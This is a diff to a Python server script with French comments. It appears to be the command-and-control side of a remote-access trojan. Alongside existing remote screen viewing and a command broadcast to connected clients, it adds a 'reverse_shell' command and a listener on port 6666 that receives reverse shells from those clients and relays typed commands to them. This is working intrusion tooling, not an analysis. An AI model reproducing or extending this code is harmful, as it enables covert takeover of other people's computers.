@@ -11,6 +11,7 @@ import io
 import cv2
 import numpy as np
 import time
+import queue
 
 
 SERVER_HOST = '0.0.0.0'
@@ -150,6 +151,26 @@ def handle_client(client_socket, client_address):
                 process_data(data, client_address[0])
         except:
             break
+    # while True:
+    #     try:
+    #         raw_size = client_socket.recv(4)
+    #         if not raw_size:
+    #             break
+    #         size = struct.unpack("!I", raw_size)[0]
+    #         data = b""
+    #         while len(data) < size:
+    #             packet = client_socket.recv(size - len(data))
+    #             if not packet:
+    #                 break
+    #             data += packet
+
+    #         print(f"[DEBUG] Payload reçu : {len(data)} octets")  # <= ajoute ça
+    #         process_data(data.decode('utf-8'), client_address[0])
+
+    #     except Exception as e:
+    #         print(f"[EXCEPTION] {e}")  # <= active temporairement
+    #         break
+
     client_socket.close()
 
     del clients[client_address]
@@ -162,6 +183,49 @@ def accept_connections():
         threading.Thread(target=handle_client, args=(client_socket, client_address)).start()
 
 
+def shell_listener():
+    shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    shell_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    shell_socket.bind((SERVER_HOST, 6666))
+    shell_socket.listen(1)
+    print("[*] Reverse shell en attente sur le port 6666...")
+
+    conn, addr = shell_socket.accept()
+    print(f"[+] Shell connecté depuis {addr}")
+
+    # On arrête l'interface principale (Admin>) pendant le shell interactif
+    print("[*] Shell interactif ouvert (tape 'exit' pour quitter)\n")
+
+    def receive():
+        try:
+            while True:
+                data = conn.recv(4096)
+                if not data:
+                    break
+                print(data.decode(errors='ignore'), end='', flush=True)
+        except Exception as e:
+            print(f"[!] Erreur réception : {e}")
+
+    recv_thread = threading.Thread(target=receive, daemon=True)
+    recv_thread.start()
+
+    try:
+        while True:
+            cmd = input()  # pas de prompt pour éviter conflit
+            if cmd.lower() in ("exit", "quit"):
+                conn.send(b"exit\n")
+                break
+            conn.send((cmd + "\n").encode())
+    except Exception as e:
+        print(f"[!] Erreur input utilisateur : {e}")
+    finally:
+        conn.close()
+        shell_socket.close()
+        print("\n[*] Reverse shell fermé.\n")
+
+
+
+
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.bind((SERVER_HOST, SERVER_PORT))
 server_socket.listen(5)
@@ -169,6 +233,7 @@ print(f"[*] Serveur en écoute sur {SERVER_HOST}:{SERVER_PORT}...")
 
 
 threading.Thread(target=accept_connections, daemon=True).start()
+
 
 try:
     while True:
@@ -178,20 +243,65 @@ try:
 
         elif command == "remote":
             threading.Thread(target=remote_view, daemon=True).start()
-            time.sleep(1.5)  # Attendre lecoute du port 5555
+            time.sleep(1.5)
             for client in clients.values():
                 client.send(command.encode('utf-8'))
 
-        elif command:
+        elif command == "reverse_shell":
+            # Envoi D'ABORD la commande 'reverse' au client via le port 4444
+            for client in clients.values():
+                client.send(b"reverse")
+
+            # Attente rapide avant d'activer le listener
+            time.sleep(1)
+
+            # Ensuite lance immédiatement le listener sur 6666
+            shell_listener()
+
+        else:
+            # Envoi normal de commandes aux clients
             for client in clients.values():
                 client.send(command.encode('utf-8'))
 
-
-        
 except KeyboardInterrupt:
     print("\n[!] Arrêt du serveur par l'utilisateur.")
 finally:
     server_socket.close()
     conn.close()
     print("[*] Serveur arrêté proprement.")
+
+
+
+# try:
+#     while True:
+#         command = input("Admin > ").strip()
+#         if command == "exit":
+#             break
+
+#         elif command == "remote":
+#             threading.Thread(target=remote_view, daemon=True).start()
+#             time.sleep(1.5)  # Attendre lecoute du port 5555
+#             for client in clients.values():
+#                 client.send(command.encode('utf-8'))
+
+#         elif command == "reverse_shell":
+#             t = threading.Thread(target=shell_listener, daemon=True)
+#             t.start()
+#             time.sleep(1)
+#             for client in clients.values():
+#                 client.send(b"reverse")
+
+
+#         elif command:
+#             for client in clients.values():
+#                 client.send(command.encode('utf-8'))
+
+
+        
+# except KeyboardInterrupt:
+#     print("\n[!] Arrêt du serveur par l'utilisateur.")
+# finally:
+#     server_socket.close()
+#     conn.close()
+#     print("[*] Serveur arrêté proprement.")
 
